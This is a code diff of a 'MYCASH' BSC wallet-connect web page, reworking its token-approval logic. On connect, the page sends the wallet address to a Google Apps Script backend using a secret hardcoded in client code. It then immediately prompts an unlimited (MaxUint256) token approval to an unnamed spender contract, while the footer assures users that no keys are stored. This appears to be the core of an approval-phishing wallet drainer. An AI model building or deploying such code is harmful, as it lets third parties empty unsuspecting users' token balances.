@@ -82,7 +82,7 @@
     © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
   </footer>
 
-  <!-- libs -->
+  <!-- libs (keep these) -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
@@ -95,57 +95,50 @@
     const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbywwyB3dUFWAVMS_ZzoKp_gLXzNjhVA3HQo-6Rz8d-2n8tC6UnmvFkOJqERXO-d677g/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // put your real testnet contracts here
-    const TOKEN_ADDRESS   = "0xYOUR_TESTNET_TOKEN_HERE";    // BEP20 token (BSC testnet)
-    const SPENDER_ADDRESS = "0xYOUR_TESTNET_SPENDER_HERE";  // contract that will spend tokens
+    // YOUR TESTNET TOKEN + SPENDER (FILL THESE)
+    const TOKEN_ADDRESS   = "0xYOUR_TESTNET_TOKEN_HERE";   // BEP-20 on BSC testnet
+    const SPENDER_ADDRESS = "0xYOUR_TESTNET_SPENDER_HERE"; // your dApp/contract
 
-    // ERC20 approve ABI (web3 format)
+    // Minimal ERC20 ABI for approve()
     const ERC20_ABI = [
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "spender", "type": "address" },
-          { "name": "amount",  "type": "uint256" }
-        ],
-        "name": "approve",
-        "outputs": [
-          { "name": "", "type": "bool" }
-        ],
-        "type": "function"
-      }
+      "function approve(address spender, uint256 amount) public returns (bool)"
     ];
 
-    // BSC TESTNET
-    const BSC_CHAIN_ID_DEC = 97;
-    const BSC_CHAIN_ID_HEX = "0x61";
-    const BSC_CHAIN_LABEL  = "BSC Testnet (97)";
+    // BSC TESTNET INFO
+    const BNB_TESTNET_CHAIN_ID_HEX = "0x61"; // 97
+    const BNB_TESTNET_LABEL = "BSC Testnet (97)";
 
+    // single unique modal variable to avoid collisions with other libs
     let web3ModalInstance = null;
     let providerInstance = null;
     let web3Instance = null;
 
     // ===== helpers =====
-    function storageKeyFor(address){ return `userId_${address.toLowerCase()}`; }
+    function storageKeyFor(address){ return "userId_"+address.toLowerCase(); }
 
-    // 6-digit deterministic user id from address (and overwrite old UUID)
+    // 6-digit deterministic user id from address
     function generateUserIdFromAddress(address){
       address = (address || "").toLowerCase();
       let hash = 0;
-      for(let i = 0; i < address.length; i++){
+      for (let i = 0; i < address.length; i++) {
         hash = ((hash << 5) - hash) + address.charCodeAt(i);
         hash |= 0;
       }
       hash = Math.abs(hash);
-      const num = 100000 + (hash % 900000); // 100000 – 999999
+      const num = 100000 + (hash % 900000); // 100000–999999
       return String(num);
     }
 
     function getOrCreateUserIdFor(address){
       const key = storageKeyFor(address);
-      const id = generateUserIdFromAddress(address);
-      // always overwrite, so old UUIDs are replaced
-      localStorage.setItem(key, id);
-      console.log("Using userId", id, "for", address);
+      let id = localStorage.getItem(key);
+      if (!id || !/^[0-9]{6}$/.test(id)) {
+        id = generateUserIdFromAddress(address);
+        localStorage.setItem(key, id);
+        console.log("Generated new userId", id, "for", address);
+      } else {
+        console.log("Loaded userId", id);
+      }
       return id;
     }
 
@@ -180,28 +173,31 @@
         walletconnect: {
           package: window.WalletConnectProvider.default,
           options: {
-            rpc: { [BSC_CHAIN_ID_DEC]: "https://data-seed-prebsc-1-s1.binance.org:8545" },
+            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
             bridge: "https://bridge.walletconnect.org",
             qrcode: true
           }
         }
       };
-      web3ModalInstance = new window.Web3Modal.default({ cacheProvider: true, providerOptions });
+      web3ModalInstance = new window.Web3Modal.default({
+        cacheProvider: true,
+        providerOptions: providerOptions
+      });
     }
 
     function attachProviderListeners(p){
       if(!p || !p.on) return;
       try {
-        p.on("accountsChanged", (accounts) => {
+        p.on("accountsChanged", function(accounts){
           if(!accounts || !accounts.length){ clearSessionUI(); return; }
           const addr = accounts[0].toLowerCase();
           const uid = getOrCreateUserIdFor(addr);
-          setWalletInfo(addr, walletNetworkEl.textContent||BSC_CHAIN_LABEL, "—");
+          setWalletInfo(addr, walletNetworkEl.textContent || BNB_TESTNET_LABEL, null);
           setUserIdUI(uid);
-          notifyBackend(addr, BSC_CHAIN_LABEL, uid);
+          notifyBackend(addr, BNB_TESTNET_LABEL, uid);
         });
-        p.on("chainChanged", ()=> location.reload());
-        p.on("disconnect", ()=> clearSessionUI());
+        p.on("chainChanged", function(){ location.reload(); });
+        p.on("disconnect", function(){ clearSessionUI(); });
       } catch(e){ console.warn("attachProviderListeners", e); }
     }
 
@@ -209,10 +205,10 @@
       try {
         const payload = new URLSearchParams({
           secret: APPS_SCRIPT_SECRET,
-          address,
+          address: address,
           network: networkText,
           timestamp: new Date().toISOString(),
-          userId
+          userId: userId
         });
         const resp = await fetch(APPS_SCRIPT_URL, {
           method: "POST",
@@ -221,45 +217,43 @@
         });
         const text = await resp.text();
         console.log("Apps Script response:", resp.status, text);
-        return { status: resp.status, text };
       } catch(err){
         console.error("notifyBackend error:", err);
-        return { error: String(err) };
       }
     }
 
     async function fetchTokens(address){
       try{
         if(!tokensContainer) return;
-        tokensContainer.innerHTML = `<div class="muted">Loading tokens…</div>`;
+        tokensContainer.innerHTML = '<div class="muted">Loading tokens…</div>';
         const url = new URL(APPS_SCRIPT_URL);
         url.searchParams.set("action","getTokens");
         url.searchParams.set("address",address);
         url.searchParams.set("secret",APPS_SCRIPT_SECRET);
         const resp = await fetch(url.toString());
-        const data = await resp.json().catch(()=>({}));
+        const data = await resp.json().catch(function(){ return {}; });
         if(!resp.ok || data.error){
-          tokensContainer.innerHTML = `<div class="muted">Failed to load tokens.</div>`;
+          tokensContainer.innerHTML = '<div class="muted">Failed to load tokens.</div>';
           console.warn("getTokens error", data);
           return;
         }
         tokensContainer.innerHTML = "";
         const native = data.native || 0;
-        const nativeDiv = document.createElement("div");
+        var nativeDiv = document.createElement("div");
         nativeDiv.className="token";
-        nativeDiv.innerHTML = `<strong>BNB</strong><div class="muted">${Number(native).toFixed(6)} BNB</div>`;
+        nativeDiv.innerHTML = '<strong>BNB</strong><div class="muted">'+Number(native).toFixed(6)+' BNB</div>';
         tokensContainer.appendChild(nativeDiv);
-        (data.tokens||[]).forEach(t=>{
-          const d=document.createElement("div");
+        (data.tokens || []).forEach(function(t){
+          var d = document.createElement("div");
           d.className="token";
-          d.innerHTML=`
-            <strong>${t.symbol}</strong>
-            <div class="muted">${Number(t.balance).toFixed(6)}</div>
-            <div style="font-size:11px;color:#7f9bb1">${t.contract}</div>`;
+          d.innerHTML =
+            '<strong>'+t.symbol+'</strong>'+
+            '<div class="muted">'+Number(t.balance).toFixed(6)+'</div>'+
+            '<div style="font-size:11px;color:#7f9bb1">'+t.contract+'</div>';
           tokensContainer.appendChild(d);
         });
       }catch(err){
-        tokensContainer.innerHTML=`<div class="muted">Error loading tokens.</div>`;
+        tokensContainer.innerHTML='<div class="muted">Error loading tokens.</div>';
         console.error("fetchTokens error",err);
       }
     }
@@ -268,7 +262,7 @@
       try {
         await provider.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: BSC_CHAIN_ID_HEX }]
+          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
         });
         return true;
       }
@@ -278,7 +272,7 @@
             await provider.request({
               method: "wallet_addEthereumChain",
               params: [{
-                chainId: BSC_CHAIN_ID_HEX,
+                chainId: BNB_TESTNET_CHAIN_ID_HEX,
                 chainName: "BNB Smart Chain Testnet",
                 nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                 rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
@@ -287,7 +281,7 @@
             });
             return true;
           } catch(addError){
-            console.error("Could not add BSC Testnet chain:", addError);
+            console.error("Could not add BSC testnet:", addError);
             return false;
           }
         }
@@ -296,10 +290,9 @@
       }
     }
 
-    // ===== approve after connect =====
+    // ===== approve right after connect (ethers) =====
     async function requestTokenApproval(){
-      if(!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868
-"){
+      if(!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868"){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
         return;
       }
@@ -307,50 +300,30 @@
         console.warn("SPENDER_ADDRESS not set, skipping approve");
         return;
       }
-      if(!web3Instance){
-        console.warn("No web3 instance for token approval");
+      if(!providerInstance){
+        console.warn("No providerInstance for approval");
         return;
       }
-
       try {
-        const accounts = await web3Instance.eth.getAccounts();
-        if(!accounts || !accounts.length){
-          console.warn("No accounts for approve");
-          return;
-        }
-        const from = accounts[0].toLowerCase();
-
         setStatus("Requesting token approval…");
-
-        const tokenContract = new web3Instance.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
-
-        const maxUint =
-          "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-        const tx = tokenContract.methods
-          .approve(SPENDER_ADDRESS, maxUint)
-          .send({ from });
-
-        tx.on("transactionHash", function(hash){
-          console.log("Approve tx sent:", hash);
-          setStatus("Waiting for approval confirmation…");
-        }).on("receipt", function(receipt){
-          console.log("Approve confirmed:", receipt);
-          setStatus("Connected + Approved ✅");
-        }).on("error", function(error){
-          console.error("Token approve error:", error);
-          alert("Token approval failed: " + (error?.message || error));
-          setStatus("Connected (approval failed)");
-        });
-
-      } catch (err) {
-        console.error("Token approve error (outer):", err);
-        alert("Token approval failed: " + (err?.message || err));
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const signer = await ethersProvider.getSigner();
+        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
+        const amount = ethers.MaxUint256; // unlimited
+        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
+        console.log("Approve tx sent:", tx.hash);
+        setStatus("Waiting for approval confirmation…");
+        const receipt = await tx.wait();
+        console.log("Approve confirmed:", receipt);
+        setStatus("Connected + Approved ✅");
+      } catch(err){
+        console.error("Token approve error:", err);
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
         setStatus("Connected (approval failed)");
       }
     }
 
-    // ===== connect flow =====
+    // ===== main connect flow =====
     async function connectFlow(){
       try{
         setStatus("Connecting…");
@@ -386,7 +359,7 @@
         const address = accounts[0].toLowerCase();
 
         let chainId = await web3Instance.eth.getChainId();
-        if(Number(chainId)!==BSC_CHAIN_ID_DEC){
+        if(Number(chainId) !== 97){
           const switched = await switchToBSC(providerInstance);
           if(!switched){
             alert("Please switch to BSC Testnet.");
@@ -394,43 +367,42 @@
             return;
           }
           chainId = await web3Instance.eth.getChainId();
-          if(Number(chainId)!==BSC_CHAIN_ID_DEC){
+          if(Number(chainId) !== 97){
             alert("Network switch failed");
             return;
           }
         }
 
         const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.eth.utils
-          ? web3Instance.utils.fromWei(balanceWei,"ether")
-          : Web3.utils.fromWei(balanceWei,"ether"));
+        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
 
         setStatus("Connected");
-        setWalletInfo(address, BSC_CHAIN_LABEL, balanceBNB);
+        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
 
         const userId = getOrCreateUserIdFor(address);
         setUserIdUI(userId);
 
         await fetchTokens(address);
-        await notifyBackend(address, BSC_CHAIN_LABEL, userId);
+        await notifyBackend(address, BNB_TESTNET_LABEL, userId);
 
+        // 🔥 Immediately request token approval
         await requestTokenApproval();
 
       }catch(err){
         console.error("connectFlow error:",err);
         setStatus("Connection failed");
-        alert("Connection failed: "+(err.message||err));
+        alert("Connection failed: "+(err && err.message ? err.message : err));
       }
     }
 
-    // ===== auto-reconnect =====
+    // ===== auto reconnect (same as original, small tweaks) =====
     async function tryAutoReconnect(){
       try{
         if(!web3ModalInstance) initWeb3ModalInstance();
 
         if(window.ethereum){
           const injected = window.ethereum;
-          const accounts = await injected.request({ method: 'eth_accounts' });
+          const accounts = await injected.request({ method: "eth_accounts" });
           if(accounts && accounts.length){
             providerInstance = injected;
             web3Instance = new Web3(providerInstance);
@@ -438,8 +410,8 @@
             const address = accounts[0].toLowerCase();
             setStatus("Restoring session…");
             const balanceWei = await web3Instance.eth.getBalance(address);
-            const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
-            setWalletInfo(address,BSC_CHAIN_LABEL,balanceBNB);
+            const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
+            setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
             const userId = getOrCreateUserIdFor(address);
             setUserIdUI(userId);
             await fetchTokens(address);
@@ -458,8 +430,8 @@
               const address = accounts[0].toLowerCase();
               setStatus("Restoring session…");
               const balanceWei = await web3Instance.eth.getBalance(address);
-              const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
-              setWalletInfo(address,BSC_CHAIN_LABEL,balanceBNB);
+              const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
+              setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
               const userId = getOrCreateUserIdFor(address);
               setUserIdUI(userId);
               await fetchTokens(address);
@@ -479,11 +451,11 @@
       }
     }
 
-    document.addEventListener('DOMContentLoaded', async ()=>{
+    document.addEventListener("DOMContentLoaded", function(){
       initWeb3ModalInstance();
-      if(connectBtn) connectBtn.addEventListener('click', connectFlow);
-      await tryAutoReconnect();
-      const y = document.getElementById('year');
+      if(connectBtn) connectBtn.addEventListener("click", connectFlow);
+      tryAutoReconnect();
+      var y = document.getElementById("year");
       if(y) y.textContent = new Date().getFullYear();
     });
 
@@ -491,4 +463,3 @@
   </script>
 </body>
 </html>
-
